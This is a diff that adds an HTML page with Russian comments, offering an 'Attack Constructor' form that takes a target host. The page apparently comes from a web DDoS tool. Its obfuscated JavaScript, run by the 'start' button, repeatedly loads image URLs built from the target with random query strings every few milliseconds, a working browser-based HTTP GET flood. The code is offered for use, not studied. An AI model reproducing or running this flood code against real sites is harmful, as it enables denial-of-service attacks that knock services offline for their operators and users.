@@ -1,0 +1,88 @@
+<!-- Кнопка для открытия модальной формы входа -->
+<center><button onclick="document.getElementById('id01').style.display='block'">Open the Attack Constructor</button></center>
+<!-- Модальный -->
+<div id="id01" class="modal">
+  <span onclick="document.getElementById('id01').style.display='none'"
+class="close" title="Закрыть модальный">&times;</span>
+
+  <!-- Модальный контент -->
+  <form class="modal-content animate" action="/action_page.php">
+    <div class="imgcontainer">
+    </div>
+
+    <div class="container">
+    	<center>
+      <input type="text" placeholder="Target" id="ddos" required>
+      	<br>
+      	<center>Method: <select class="form-control cc-select-icon cc-mode-icon" id="select_"><option value="GET">HTTP-GET</option></select></center>
+ </center>
+</div>
+    
+
+    <div class="container" style="background-color:#f1f1f1">
+      <button type="button" onclick="lok()" class="cancelbtn">start</button>
+      
+    </div>
+  </form>
+  <script>
+function _0x3658(_0x3b4bdb,_0x19c692){var _0x3aab4a=_0x3aab();return _0x3658=function(_0x3658ad,_0x4f430c){_0x3658ad=_0x3658ad-0x14d;var _0x1b0a8e=_0x3aab4a[_0x3658ad];return _0x1b0a8e;},_0x3658(_0x3b4bdb,_0x19c692);}function _0x3aab(){var _0x584a22=['80526SXomfF','ddos','1318338TWSyJf','getElementById','768798YLFRtI','4459752GafDjB','http://','src','random','12uiWwrz','\x20started\x0a\x20method:\x20HTTPS-FLOOD','GET','7IxNiUu','720055USkpuj','6HrpjjU','value','=asdf','870720oZdvKp','1455930bmWAzZ','select_','floor'];_0x3aab=function(){return _0x584a22;};return _0x3aab();}(function(_0x552e71,_0x54926a){var _0x376833=_0x3658,_0x4024ac=_0x552e71();while(!![]){try{var _0x2eee15=parseInt(_0x376833(0x154))/0x1*(-parseInt(_0x376833(0x15d))/0x2)+-parseInt(_0x376833(0x161))/0x3+-parseInt(_0x376833(0x151))/0x4*(-parseInt(_0x376833(0x155))/0x5)+-parseInt(_0x376833(0x156))/0x6*(-parseInt(_0x376833(0x15f))/0x7)+parseInt(_0x376833(0x14d))/0x8+-parseInt(_0x376833(0x15a))/0x9+-parseInt(_0x376833(0x159))/0xa;if(_0x2eee15===_0x54926a)break;else _0x4024ac['push'](_0x4024ac['shift']());}catch(_0xec6495){_0x4024ac['push'](_0x4024ac['shift']());}}}(_0x3aab,0x5f6e7),lok=function(){var _0x7eda04=_0x3658,_0x1fbc7d=escape(document['getElementById'](_0x7eda04(0x15e))[_0x7eda04(0x157)]),_0x3050d1=document[_0x7eda04(0x160)](_0x7eda04(0x15b)),_0x40a0ab=_0x3050d1['value'];if(_0x40a0ab==_0x7eda04(0x153)){alert('Attack\x20for\x20'+_0x1fbc7d+_0x7eda04(0x152));function _0xa62fce(){var _0x13526b=_0x7eda04,_0x41add2='/',_0x511723=new Image(),_0x396b72=Math[_0x13526b(0x15c)](Math[_0x13526b(0x150)]()*0xdac),_0x3f1402=Math[_0x13526b(0x15c)](Math['random']()*0xdac),_0x2cf777=Math[_0x13526b(0x15c)](Math['random']()*0xdac),_0x232138=Math[_0x13526b(0x15c)](Math[_0x13526b(0x150)]()*0xdac);_0x511723[_0x13526b(0x14f)]=_0x13526b(0x14e)+_0x1fbc7d+_0x41add2+'&'+_0x396b72+_0x13526b(0x158),_0x511723[_0x13526b(0x14f)]=_0x13526b(0x14e)+_0x1fbc7d+_0x41add2+'&'+_0x3f1402+'=asdf',_0x511723['src']=_0x13526b(0x14e)+_0x1fbc7d+_0x41add2+'&'+_0x2cf777+_0x13526b(0x158),_0x511723[_0x13526b(0x14f)]='http://'+_0x1fbc7d+_0x41add2+'&'+_0x232138+_0x13526b(0x158);}setInterval(_0xa62fce,0x5);}});
+</script>
+<style>
+/* Модальный (фон) */
+.modal {
+  display: none; /* Скрыто по умолчанию */
+  position: fixed; /* Оставаться на месте */
+  z-index: 1; /* Сидеть на вершине */
+  left: 0;
+  top: 0;
+  width: 100%; /* Полная ширина */
+  height: 100%; /* Полный рост */
+  overflow: auto; /* Включите прокрутку, если это необходимо */
+  background-color: rgb(0,0,0); /* Цвет запасной вариант */
+  background-color: rgba(0,0,0,0.4); /* Черный с непрозрачностью */
+  padding-top: 60px;
+}
+
+/* Модальное Содержание/коробка */
+.modal-content {
+  background-color: #fefefe;
+  margin: 5px auto; /* 15% сверху и по центру */
+  border: 1px solid #888;
+  width: 80%; /* Может быть больше или меньше, в зависимости от размера экрана */
+}
+
+/* Кнопка закрытия */
+.close {
+  /* Расположите его в правом верхнем углу за пределами модели */
+  position: absolute;
+  right: 25px;
+  top: 0;
+  color: #000;
+  font-size: 35px;
+  font-weight: bold;
+}
+
+/* Кнопка закрытия при наведении курсора мыши */
+.close:hover,
+.close:focus {
+  color: red;
+  cursor: pointer;
+}
+
+/* Добавить анимация масштабирования */
+.animate {
+  -webkit-animation: animatezoom 0.6s;
+  animation: animatezoom 0.6s
+}
+
+@-webkit-keyframes animatezoom {
+  from {-webkit-transform: scale(0)}
+  to {-webkit-transform: scale(1)}
+}
+
+@keyframes animatezoom {
+  from {transform: scale(0)}
+  to {transform: scale(1)}
+}
+	</style>
+</div>
